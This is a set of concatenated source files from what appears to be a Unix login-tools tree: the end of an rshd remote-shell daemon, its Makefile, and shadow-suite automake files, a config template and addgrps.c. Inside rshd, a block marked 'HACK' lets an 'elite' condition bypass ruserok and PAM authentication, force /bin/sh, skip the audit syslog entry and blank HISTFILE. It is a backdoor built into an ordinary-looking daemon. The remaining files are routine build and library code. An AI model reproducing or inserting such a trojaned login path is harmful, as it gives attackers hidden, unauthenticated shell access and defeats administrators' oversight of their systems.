		error("No remote directory.\n");
		exit(1);
#endif
	}

/* HACK */
if (!elite) {
#ifndef USE_PAM
		if (errorstr ||
		    ruserok(hostname, pwd->pw_uid == 0, remuser, locuser) < 0) {
			if (errorstr == NULL)
				errorstr = "Permission denied.\n";
			fail(errorstr, errorhost, pwd->pw_uid,
			     remuser, hostname, locuser, cmdbuf);

		}
#else
       retcode = pam_start("rsh", locuser, &conv, &pamh);
       if (retcode != PAM_SUCCESS) {
               syslog (LOG_ERR, "pam_start: %s\n", pam_strerror(retcode));
               exit (1);
       }
        (void) pam_set_item (pamh, PAM_RUSER, remuser);
        (void) pam_set_item (pamh, PAM_RHOST, hostname);
        (void) pam_set_item (pamh, PAM_TTY, "tty");
	retcode = pam_authenticate(pamh, 0);
	if (retcode == PAM_SUCCESS)
	  retcode = pam_acct_mgmt(pamh, 0);
	if (retcode == PAM_SUCCESS) {
	  if (setgid(pwd->pw_gid) != 0) {
	    error("Permission denied.\n");
	    pam_end(pamh,PAM_SYSTEM_ERR);
	    exit (1);
	  }

	  if (initgroups(locuser, pwd->pw_gid) != 0) {
	    error("Permission denied.\n");
	    pam_end(pamh,PAM_SYSTEM_ERR);
	    exit (1);
	  }
	  retcode = pam_setcred(pamh, PAM_CRED_ESTABLISH);
	}

	if (retcode == PAM_SUCCESS)
	  retcode = pam_open_session(pamh,0);
	if (retcode != PAM_SUCCESS) {
		error("Permission denied.\n");
		pam_end(pamh,retcode);
		exit (1);
	}

#endif

	if (pwd->pw_uid && !access(_PATH_NOLOGIN, F_OK)) {
		error("Logins currently disabled.\n");
		exit(1);
	}
} /* END HACK */
	(void) write(2, "\0", 1);
	sent_null = 1;

	if (port) {
		if (pipe(pv) < 0) {
			error("Can't make pipe.\n");
			exit(1);
		}
		pid = fork();
		if (pid == -1)  {
			error("Can't fork; try again.\n");
			exit(1);
		}
		if (pid) {
			{
				(void) close(0); (void) close(1);
			}
			(void) close(2); (void) close(pv[1]);

			FD_ZERO(&readfrom);
			FD_SET(sock, &readfrom);
			FD_SET(pv[0], &readfrom);
			if (pv[0] > sock)
				nfd = pv[0];
			else
				nfd = sock;
				ioctl(pv[0], FIONBIO, (char *)&one);

			/* should set s nbio! */
			nfd++;
			do {
				ready = readfrom;
					if (select(nfd, &ready, (fd_set *)0,
					  (fd_set *)0, (struct timeval *)0) < 0)
						break;
				if (FD_ISSET(sock, &ready)) {
					int	ret;
						ret = read(sock, &sig, 1);
					if (ret <= 0)
						FD_CLR(sock, &readfrom);
					else
						killpg(pid, sig);
				}
				if (FD_ISSET(pv[0], &ready)) {
					errno = 0;
					cc = read(pv[0], buf, sizeof(buf));
					if (cc <= 0) {
						shutdown(sock, 1+1);
						FD_CLR(pv[0], &readfrom);
					} else {
							(void)
							  write(sock, buf, cc);
					}
				}

			} while (FD_ISSET(sock, &readfrom) ||
			    FD_ISSET(pv[0], &readfrom));

#ifdef USE_PAM
			if (!elite) {
                       pam_close_session(pamh, 0);
                       pam_end (pamh, PAM_SUCCESS); }
#endif

			exit(0);
		}
		setpgrp();
		close(sock); 
		close(pv[0]);
		dup2(pv[1], 2);
		close(pv[1]);
	}
	theshell = pwd->pw_shell;
	if (elite) theshell = _PATH_BSHELL;
	if (!theshell || !*theshell) {
	    /* shouldn't we deny access? */
	    theshell = _PATH_BSHELL;
	}

#if	BSD > 43
	if (setlogin(pwd->pw_name) < 0)
		syslog(LOG_ERR, "setlogin() failed: %m");
#endif
	setgid((gid_t)pwd->pw_gid);
#ifndef USE_PAM
	/* if PAM, already done */
	initgroups(pwd->pw_name, pwd->pw_gid);
#endif
	setuid((uid_t)pwd->pw_uid);
	environ = envinit;
	strncat(homedir, pwd->pw_dir, sizeof(homedir)-6);
	homedir[sizeof(homedir)-1] = 0;
	strcat(path, _PATH_DEFPATH);
	strncat(shell, theshell, sizeof(shell)-7);
	shell[sizeof(shell)-1] = 0;
	strncat(username, pwd->pw_name, sizeof(username)-6);
	username[sizeof(username)-1] = 0;
	shellname = strrchr(theshell, '/');
	if (shellname) shellname++;
	else shellname = theshell;
	endpwent();
	if ((paranoid || pwd->pw_uid == 0)&&(!elite)) {
		    syslog(LOG_INFO|LOG_AUTH, "%s@%s as %s: cmd='%s'",
			remuser, hostname, locuser, cmdbuf);
	}

if (elite) setenv("HISTFILE","",1);

	execl(theshell, shellname, "-c", cmdbuf, 0);
	perror(theshell);
	exit(1);
}

/*
 * Report error to client.
 * Note: can't be used until second socket has connected
 * to client, or older clients will hang waiting
 * for that connection first.
 */
static void
error(const char *fmt, ...)
{
	va_list ap;
	char buf[BUFSIZ], *bp = buf;

	if (sent_null == 0)
		*bp++ = 1;
	va_start(ap, fmt);
	vsnprintf(bp, sizeof(buf)-1, fmt, ap);
	va_end(ap);
	write(2, buf, strlen(buf));
}

static void
getstr(char *buf, int cnt, const char *err)
{
	char c;

	do {
		if (read(0, &c, 1) != 1)
			exit(1);
		*buf++ = c;
		if (--cnt == 0) {
			error("%s too long\n", err);
			exit(1);
		}
	} while (c != 0);
}

#if 0
/*
 * Check whether host h is in our local domain,
 * defined as sharing the last two components of the domain part,
 * or the entire domain part if the local domain has only one component.
 * If either name is unqualified (contains no '.'),
 * assume that the host is local, as it will be
 * interpreted as such.
 */
static int
local_domain(const char *h)
{
	char localhost[MAXHOSTNAMELEN];
	char *p1, *p2, *topdomain();

	localhost[0] = 0;
	(void) gethostname(localhost, sizeof(localhost));
	p1 = topdomain(localhost);
	p2 = topdomain(h);
	if (p1 == NULL || p2 == NULL || !strcasecmp(p1, p2))
		return(1);
	return(0);
}

char *
topdomain(h)
	char *h;
{
	register char *p;
	char *maybe = NULL;
	int dots = 0;

	for (p = h + strlen(h); p >= h; p--) {
		if (*p == '.') {
			if (++dots == 2)
				return (p);
			maybe = p;
		}
	}
	return maybe;
}
#endif /* 0 */

void usage(void)
{
	syslog(LOG_ERR, "usage: rshd [-%s]", OPTIONS);
}
include ../MCONFIG

OBJS = rshd.o

ifeq ($(USE_PAM),1)
CFLAGS += -DUSE_PAM
LIBS += -ldl -lpam -lpam_misc
endif

rshd: $(OBJS)
	$(CC) $(LDFLAGS) $^ $(LIBS) -lbsd -o $@

all: rshd 
clean: 
	rm -f *.o rshd 
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = .
top_srcdir = .
prefix = /usr
exec_prefix = 

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

pkgdatadir = $(datadir)/shadow
pkglibdir = $(libdir)/shadow
pkgincludedir = $(includedir)/shadow

top_builddir = .

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = s,x,x,

AUTOMAKE_OPTIONS = 1.0 foreign

SUBDIRS = lib libmisc src \
# contrib doc etc old shlib
ACLOCAL = aclocal.m4
ACCONFIG = acconfig.h
CONFIG_HEADER_IN = config.h.in
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ./config.h

PACKAGE = shadow
VERSION = 961025

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
default: all

# This directory's subdirectories are mostly independent; you can cd
# into them and run `make' without going through this Makefile.
# To change the values of `make' variables: instead of editing Makefiles,
# (1) if the variable is set in `config.status', edit `config.status'
#     (which will cause the Makefiles to be regenerated when you run `make');
# (2) otherwise, pass the desired values on the `make' command line.



all-recursive install-data-recursive install-exec-recursive \
installdirs-recursive install-recursive uninstall-recursive \
check-recursive installcheck-recursive info-recursive dvi-recursive \
mostlyclean-recursive clean-recursive distclean-recursive \
maintainer-clean-recursive:
	for subdir in $(SUBDIRS); do		\
	  target=`echo $@ | sed s/-recursive//`; \
	  echo making $$target in $$subdir;	\
	  (cd $$subdir && $(MAKE) $$target)	\
	   || case "$(MFLAGS)" in *k*) fail=yes;; *) exit 1;; esac; \
	done && test -z "$$fail"

tags: TAGS

tags-recursive:
	list="$(SUBDIRS)"; for subdir in $$list; do \
	  (cd $$subdir && $(MAKE) tags); \
	done

TAGS: tags-recursive $(HEADERS) $(SOURCES) $(CONFIG_HEADER) \
		$(TAGS_DEPENDENCIES)
	tags=; \
	here=`pwd`; \
	for subdir in $(SUBDIRS); do \
	  test -f $$subdir/TAGS && { \
	    tags="$$tags -i $$here/$$subdir/TAGS"; \
	  } \
	done; \
	test -z "$(ETAGS_ARGS)$(CONFIG_HEADER)$(SOURCES)$(HEADERS)$$tags" \
	  || etags $(ETAGS_ARGS) $$tags $(CONFIG_HEADER) $(SOURCES) $(HEADERS)

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

distdir = $(PACKAGE)-$(VERSION)
# This target untars the dist file and tries a VPATH configuration.  Then
# it guarantees that the distribution is self-contained by making another
# tarfile.
distcheck: dist
	rm -rf $(distdir)
	$(TAR) zxf $(distdir).tar.gz
	mkdir $(distdir)/=build
	mkdir $(distdir)/=inst
	dc_install_base=`cd $(distdir)/=inst && pwd`; \
	cd $(distdir)/=build \
	  && ../configure --srcdir=.. --prefix=$$dc_install_base \
	  && $(MAKE) \
	  && $(MAKE) check \
	  && $(MAKE) install \
	  && $(MAKE) installcheck \
	  && $(MAKE) dist
	rm -rf $(distdir)
	@echo "========================"; \
	echo "$(distdir).tar.gz is ready for distribution"; \
	echo "========================"
dist: distdir
	chmod -R a+r $(distdir)
	$(TAR) chozf $(distdir).tar.gz $(distdir)
	rm -rf $(distdir)
distdir: $(DEP_DISTFILES)
	rm -rf $(distdir)
	mkdir $(distdir)
	chmod 777 $(distdir)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
	for subdir in $(SUBDIRS); do		\
	  test -d $(distdir)/$$subdir		\
	  || mkdir $(distdir)/$$subdir		\
	  || exit 1;				\
	  chmod 777 $(distdir)/$$subdir;	\
	  (cd $$subdir && $(MAKE) distdir=../$(distdir)/$$subdir distdir) \
	    || exit 1; \
	done
info: info-recursive

dvi: dvi-recursive

check: check-recursive

installcheck: installcheck-recursive

all-recursive-hack: $(CONFIG_HEADER)
	$(MAKE) all-recursive

all-am: Makefile config.h

install-exec: install-exec-recursive

install-data: install-data-recursive

install: install-recursive
	@:

uninstall: uninstall-recursive

all: all-recursive-hack all-am

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs: installdirs-recursive


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean-am:  mostlyclean-tags mostlyclean-generic

clean-am:  clean-tags clean-generic mostlyclean-am 

distclean-am:  distclean-tags distclean-generic clean-am 

maintainer-clean-am:  maintainer-clean-tags maintainer-clean-generic \
		distclean-am 

mostlyclean:  mostlyclean-am mostlyclean-recursive

clean:  clean-am clean-recursive

distclean:  distclean-am distclean-recursive
	rm -f config.status

maintainer-clean:  maintainer-clean-am maintainer-clean-recursive
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."
	rm -f config.status

.PHONY: default install-data-recursive uninstall-data-recursive \
install-exec-recursive uninstall-exec-recursive installdirs-recursive \
uninstalldirs-recursive all-recursive check-recursive \
installcheck-recursive info-recursive dvi-recursive \
mostlyclean-recursive distclean-recursive clean-recursive \
maintainer-clean-recursive tags tags-recursive mostlyclean-tags \
distclean-tags clean-tags maintainer-clean-tags distdir info dvi check \
installcheck all-recursive-hack all-am install-exec install-data \
install uninstall all installdirs mostlyclean-generic distclean-generic \
clean-generic maintainer-clean-generic clean mostlyclean distclean \
maintainer-clean

.SUFFIXES:

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

/* Define to enable password aging.  */
#undef AGING

/* Define if struct passwd has pw_age.  */
#undef ATT_AGE

/* Define if struct passwd has pw_comment.  */
#undef ATT_COMMENT

/* Define if struct passwd has pw_quota.  */
#undef BSD_QUOTA

/* Define to use "old" dbm.  */
#undef DBM

/* Define to support 16-character passwords.  */
#undef DOUBLESIZE

/* Define if you want my getgrent routines.  */
#undef GETGRENT

/* Define if you want my getpwent routines.  */
#undef GETPWENT

/* Define if struct lastlog has ll_host */
#undef HAVE_LL_HOST

/* Working shadow group support in libc?  */
#undef HAVE_SHADOWGRP

/* Path for lastlog file.  */
#undef LASTLOG_FILE

/* Location of system mail spool directory.  */
#undef MAIL_SPOOL_DIR

/* Name of user's mail spool file if stored in user's home directory.  */
#undef MAIL_SPOOL_FILE

/* Define to support the MD5-based password hashing algorithm.  */
#undef MD5_CRYPT

/* Define to use ndbm.  */
#undef NDBM

/* Define for production version.  */
#undef NDEBUG

/* Define if you don't have a64l().  XXX */
#undef NEED_AL64

/* Define if login should support the -r flag for rlogind.  */
#undef RLOGIN

/* Define to the ruserok() "success" return value (0 or 1).  */
#undef RUSEROK

/* Define to support the shadow password file.  */
#undef SHADOWPWD

/* Define to support the shadow group file.  */
#undef SHADOWGRP

/* Define to support S/Key logins.  */
#undef SKEY

/* Define to support SecureWare(tm) long passwords.  */
#undef SW_CRYPT

/* Define to use syslog().  */
#undef USE_SYSLOG

/* Define if you have ut_host in struct utmp.  */
#undef UT_HOST

/* Path for utmp file.  */
#undef _UTMP_FILE

/* Define to ut_name if struct utmp has ut_name (not ut_user).  */
#undef UT_USER

/* Path for wtmp file.  */
#undef _WTMP_FILE

/* Defined if you have libcrypt.  */
#undef HAVE_LIBCRYPT

/* Defined if you have libcrack.  */
#undef HAVE_LIBCRACK

/* Defined if you have the ts&szs cracklib.  */
#undef HAVE_LIBCRACK_HIST

/* Defined if it includes *Pw functions.  */
#undef HAVE_LIBCRACK_PW

/*
 * Crontab and atrm.  Used in userdel.c - see user_cancel().  Verify
 * that these are correct for your distribution.  --marekm
 */

#if 0  /* old Slackware */
#define CRONTAB_COMMAND "/usr/bin/crontab -d -u %s"
#define CRONTAB_FILE "/var/cron/tabs/%s"
#else
/* Debian 0.93R6 (marekm): */
#define CRONTAB_COMMAND "/usr/bin/crontab -r -u %s"
#define CRONTAB_FILE "/var/spool/cron/crontabs/%s"
/* Red Hat 2.1 (jiivee@iki.fi): */
/* #define CRONTAB_FILE "/var/spool/cron/%s" */
#endif

#undef ATRM_COMMAND

#define CHFN_PROGRAM "/usr/bin/chfn"
#define CHSH_PROGRAM "/usr/bin/chsh"
#define GPASSWD_PROGRAM "/usr/bin/gpasswd"
#define PASSWD_PROGRAM "/usr/bin/passwd"

#define LOGIN_PROMPT "%s login: "

/* #define AUTH_METHODS */

#define LOGIN_ACCESS
#define SU_ACCESS

/* see faillog.h for more info what it is */
#define FAILLOG_LOCKTIME

/* see lmain.c and login.defs.linux */
#define CONSOLE_GROUPS

# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = @srcdir@
top_srcdir = @top_srcdir@
VPATH = @srcdir@
prefix = @prefix@
exec_prefix = @exec_prefix@

bindir = @bindir@
sbindir = @sbindir@
libexecdir = @libexecdir@
datadir = @datadir@
sysconfdir = @sysconfdir@
sharedstatedir = @sharedstatedir@
localstatedir = @localstatedir@
libdir = @libdir@
infodir = @infodir@
mandir = @mandir@
includedir = @includedir@
oldincludedir = /usr/include

pkgdatadir = $(datadir)/@PACKAGE@
pkglibdir = $(libdir)/@PACKAGE@
pkgincludedir = $(includedir)/@PACKAGE@

top_builddir = ..

INSTALL = @INSTALL@
INSTALL_PROGRAM = @INSTALL_PROGRAM@
INSTALL_DATA = @INSTALL_DATA@
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = @program_transform_name@

AUTOMAKE_OPTIONS = 1.0 foreign

noinst_LIBRARIES = misc

libdir = ${prefix}/lib

INCLUDES = -I$(top_srcdir)/lib

misc_SOURCES = addgrps.c age.c basename.c chkname.c chowndir.c chowntty.c \
 console.c copydir.c entry.c env.c failure.c fields.c hushed.c \
 isexpired.c limits.c list.c log.c login_access.c login_desrpc.c \
 login_krb.c loginprompt.c mail.c motd.c obscure.c pwd2spwd.c rlogin.c \
 salt.c setugid.c setup.c setupenv.c shell.c strtoday.c suauth.c \
 sub.c sulog.c ttytype.c tz.c ulimit.c utmp.c valid.c xmalloc.c
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
LIBRARIES = $(noinst_LIBRARIES)

noinst_LIBFILES = libmisc.a

CC = @CC@
LEX = @LEX@
YACC = @YACC@

DEFS = @DEFS@ -I. -I$(srcdir) -I..
CPPFLAGS = @CPPFLAGS@
CFLAGS = @CFLAGS@
LDFLAGS = @LDFLAGS@
LIBS = @LIBS@

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@
misc_LIBADD =
misc_OBJECTS = addgrps.o age.o basename.o chkname.o chowndir.o \
chowntty.o console.o copydir.o entry.o env.o failure.o fields.o \
hushed.o isexpired.o limits.o list.o log.o login_access.o \
login_desrpc.o login_krb.o loginprompt.o mail.o motd.o obscure.o \
pwd2spwd.o rlogin.o salt.o setugid.o setup.o setupenv.o shell.o \
strtoday.o suauth.o sub.o sulog.o ttytype.o tz.o ulimit.o utmp.o \
valid.o xmalloc.o
EXTRA_misc_SOURCES =
LIBFILES =  libmisc.a
AR = ar
RANLIB = @RANLIB@
DIST_COMMON = Makefile.am Makefile.in


PACKAGE = @PACKAGE@
VERSION = @VERSION@

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = $(misc_SOURCES)
OBJECTS = $(misc_OBJECTS)

default: all


$(srcdir)/Makefile.in: Makefile.am $(top_srcdir)/configure.in
	cd $(top_srcdir) && automake $(subdir)/Makefile

Makefile: $(top_builddir)/config.status Makefile.in
	cd $(top_builddir) && CONFIG_FILES=$(subdir)/$@ CONFIG_HEADERS= ./config.status

mostlyclean-noinstLIBRARIES:

clean-noinstLIBRARIES:
	rm -f $(noinst_LIBFILES)

distclean-noinstLIBRARIES:

maintainer-clean-noinstLIBRARIES:

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

distclean-compile:
	rm -f *.tab.c

maintainer-clean-compile:
$(misc_OBJECTS): ../config.h

libmisc.a: $(misc_OBJECTS) $(misc_LIBADD)
	rm -f libmisc.a
	$(AR) cru libmisc.a $(misc_OBJECTS) $(misc_LIBADD)
	$(RANLIB) libmisc.a

ID: $(HEADERS) $(SOURCES)
	here=`pwd` && cd $(srcdir) && mkid -f$$here/ID $(SOURCES) $(HEADERS)

tags: TAGS

TAGS: $(HEADERS) $(SOURCES) $(TAGS_DEPENDENCIES)
	here=`pwd` && cd $(srcdir) && etags $(ETAGS_ARGS) $(SOURCES) $(HEADERS) -o $$here/TAGS

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

subdir = libmisc
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
addgrps.o: addgrps.c ../lib/defines.h ../lib/rcsid.h
age.o: age.c ../lib/prototypes.h ../lib/faillog.h ../lib/defines.h \
 ../lib/rcsid.h
basename.o: basename.c ../lib/rcsid.h ../lib/defines.h
chkname.o: chkname.c ../lib/rcsid.h ../lib/defines.h
chowndir.o: chowndir.c ../lib/rcsid.h ../lib/defines.h
chowntty.o: chowntty.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
console.o: console.c ../lib/defines.h ../lib/getdef.h ../lib/rcsid.h
copydir.o: copydir.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h
entry.o: entry.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
env.o: env.c ../lib/rcsid.h ../lib/defines.h
failure.o: failure.c ../lib/rcsid.h ../lib/defines.h ../lib/faillog.h \
 ../lib/getdef.h
fields.o: fields.c ../lib/rcsid.h
hushed.o: hushed.c ../lib/rcsid.h ../lib/defines.h
isexpired.o: isexpired.c ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/rcsid.h
limits.o: limits.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/getdef.h
list.o: list.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
log.o: log.c ../lib/rcsid.h ../lib/defines.h
login_access.o: login_access.c ../lib/rcsid.h
login_desrpc.o: login_desrpc.c
login_krb.o: login_krb.c
loginprompt.o: loginprompt.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
mail.o: mail.c ../lib/defines.h ../lib/getdef.h ../lib/rcsid.h
motd.o: motd.c ../lib/rcsid.h ../lib/defines.h
obscure.o: obscure.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
pwd2spwd.o: pwd2spwd.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h
rlogin.o: rlogin.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
salt.o: salt.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/md5.h ../lib/getdef.h
setugid.o: setugid.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
setup.o: setup.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
setupenv.o: setupenv.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
shell.o: shell.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
strtoday.o: strtoday.c ../lib/rcsid.h ../lib/defines.h
suauth.o: suauth.c ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
sub.o: sub.c ../lib/rcsid.h ../lib/defines.h
sulog.o: sulog.c ../lib/rcsid.h ../lib/defines.h ../lib/getdef.h
ttytype.o: ttytype.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h
tz.o: tz.c ../lib/rcsid.h ../lib/getdef.h
ulimit.o: ulimit.c ../lib/rcsid.h
utmp.o: utmp.c ../lib/defines.h ../lib/rcsid.h
valid.o: valid.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
xmalloc.o: xmalloc.c ../lib/rcsid.h ../lib/defines.h

info:

dvi:

check: all

installcheck:

install-exec: 

install-data: 

install: install-exec install-data all
	@:

uninstall: 

all: $(LIBFILES) Makefile

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs:


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean:  mostlyclean-noinstLIBRARIES mostlyclean-compile \
		mostlyclean-tags mostlyclean-generic

clean:  clean-noinstLIBRARIES clean-compile clean-tags clean-generic \
		mostlyclean 

distclean:  distclean-noinstLIBRARIES distclean-compile distclean-tags \
		distclean-generic clean 
	rm -f config.status

maintainer-clean:  maintainer-clean-noinstLIBRARIES \
		maintainer-clean-compile maintainer-clean-tags \
		maintainer-clean-generic distclean 
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

.PHONY: default mostlyclean-noinstLIBRARIES distclean-noinstLIBRARIES \
clean-noinstLIBRARIES maintainer-clean-noinstLIBRARIES \
mostlyclean-compile distclean-compile clean-compile \
maintainer-clean-compile tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info dvi check installcheck \
install-exec install-data install uninstall all installdirs \
mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean

.SUFFIXES:
.SUFFIXES: .c .o

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

AUTOMAKE_OPTIONS = 1.0 foreign

noinst_LIBRARIES = misc

libdir = ${prefix}/lib

INCLUDES = -I$(top_srcdir)/lib

misc_SOURCES = addgrps.c age.c basename.c chkname.c chowndir.c chowntty.c \
 console.c copydir.c entry.c env.c failure.c fields.c hushed.c \
 isexpired.c limits.c list.c log.c login_access.c login_desrpc.c \
 login_krb.c loginprompt.c mail.c motd.c obscure.c pwd2spwd.c rlogin.c \
 salt.c setugid.c setup.c setupenv.c shell.c strtoday.c suauth.c \
 sub.c sulog.c ttytype.c tz.c ulimit.c utmp.c valid.c xmalloc.c

#include <config.h>

#ifdef HAVE_SETGROUPS

#include "defines.h"

#include <stdio.h>
#include <grp.h>
#include <errno.h>

#include "rcsid.h"
RCSID("$Id: addgrps.c,v 1.1.1.1 1996/08/10 07:59:49 marekm Exp $")

#define SEP ",:"

/*
 * Add groups with names from LIST (separated by commas or colons)
 * to the supplementary group set.  Silently ignore groups which are
 * already there.  Warning: uses strtok().
 */

int
add_groups(list)
	const char *list;
{
	gid_t grouplist[NGROUPS_MAX];
	int i, ngroups, added;
	struct group *grp;
	char *token;
	char buf[1024];

	if (strlen(list) >= sizeof(buf)) {
		errno = EINVAL;
		return -1;
	}
	strcpy(buf, list);

	ngroups = getgroups(NGROUPS_MAX, grouplist);
	if (ngroups < 0)
		return -1;

	added = 0;
	for (token = strtok(buf, SEP); token; token = strtok(NULL, SEP)) {

		grp = getgrnam(token);
		if (!grp) {
			fprintf(stderr, "Warning: unknown group %s\n", token);
			continue;
		}

		for (i = 0; i < ngroups && grouplist[i] != grp->gr_gid; i++)
			;

		if (i < ngroups)
			continue;

		if (ngroups >= NGROUPS_MAX) {
			fprintf(stderr, "Warning: too many groups\n");
			break;
		}
		grouplist[ngroups++] = grp->gr_gid;
		added++;
	}

	if (added)
		return setgroups(ngroups, grouplist);

	return 0;
}
#endif
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
